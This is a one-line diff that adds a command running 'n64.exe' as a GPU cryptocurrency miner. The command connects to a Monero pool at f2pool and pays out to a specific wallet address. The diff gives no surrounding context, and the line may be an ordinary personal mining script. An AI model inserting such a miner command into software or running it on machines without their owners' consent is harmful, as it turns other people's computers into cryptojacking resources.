@@ -1,0 +1,1 @@
+n64.exe --donate-level=1 --cuda-max-threads=N --cuda-bfactor=12 --cuda-bsleep=101 -o xmr.f2pool.com:13531 -u 47WRm77iTjPXJABH4scnXVEP6BB6JaLwbVKB1NbPbtce72wFdL6EpKQap46f2mNKjCcjGZQcWwQJVYZ9Ly8VedmgFiYcR4H.gpuceshi -p x -k
